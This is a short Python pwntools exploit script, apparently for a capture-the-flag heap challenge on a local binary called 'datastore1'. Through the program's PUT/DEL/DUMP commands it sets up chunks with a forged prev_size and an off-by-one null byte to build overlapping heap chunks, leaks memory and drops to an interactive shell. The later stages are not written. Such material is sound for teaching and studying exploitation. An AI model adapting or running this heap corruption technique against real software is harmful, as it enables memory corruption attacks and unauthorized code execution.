#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./datastore1')
libc = ELF('libc.so.6')
p = process('./datastore1')

def get(key):
    p.recvuntil('PROMPT: Enter command:\n')
    p.sendline('GET')
    p.recvuntil('row key:\n')
    p.sendline(key)

def put(key,data_size,data):
    p.recvuntil('PROMPT: Enter command:\n')
    p.sendline('PUT')
    p.recvuntil('row key:\n')
    p.sendline(key)
    p.recvuntil('data size:\n')
    p.sendline(str(data_size))
    p.recvuntil('data:\n')
    p.send(data)

def dump():
    p.recvuntil('PROMPT: Enter command:\n')
    p.sendline('DUMP')

def dele(key):
    p.recvuntil('PROMPT: Enter command:\n')
    p.sendline('DEL')
    p.recvuntil('row key:\n')
    p.sendline(key)

def debug():
    gdb.attach(p)
    pause()


dele('th3fl4g')
put('aaa',0x80,'1'*0x80)
put('bbb',0x18,'2'*0x18)
put('ccc',0x60,'3'*0x60)

put('ccc',0xf0,'4'*0xf0)

put(b"d"*0x8+p64(0)+p64(0x200), 0x20, p8(0)*0x20)

dele('aaa')

dele('ccc')


put("a", 0x88, p8(0)*0x88)

dump()

# put('ccc',0x60,'789')
#
#
# PUT("A"*0x8, 0x80, p8(0)*0x80)
# PUT("B"*0x8, 0x18, p8(0)*0x18)
# PUT("C"*0x8, 0x60, p8(0)*0x60)
# PUT("C"*0x8, 0xf0, p8(0)*0xf0)
# PUT("D"*0x8+p64(0)+p64(0x200), 0x20, p8(0)*0x20)
p.interactive()
